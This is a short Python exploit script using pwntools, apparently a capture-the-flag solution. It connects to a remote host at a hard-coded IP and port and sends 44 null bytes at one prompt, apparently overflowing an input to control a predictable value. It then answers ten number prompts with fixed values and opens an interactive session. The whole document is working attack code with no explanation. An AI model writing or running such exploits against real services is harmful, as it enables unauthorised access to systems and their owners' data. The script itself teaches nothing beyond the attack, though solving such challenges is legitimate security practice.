from pwn import *

io = remote("39.96.88.40", 7040)

io.sendlineafter("is :", "\x00" * 0x2c)

for i in (55, 15, 82, 1, 98, 68, 67, 15, 86, 3):
    io.sendlineafter("Number:", str(i))

io.interactive()
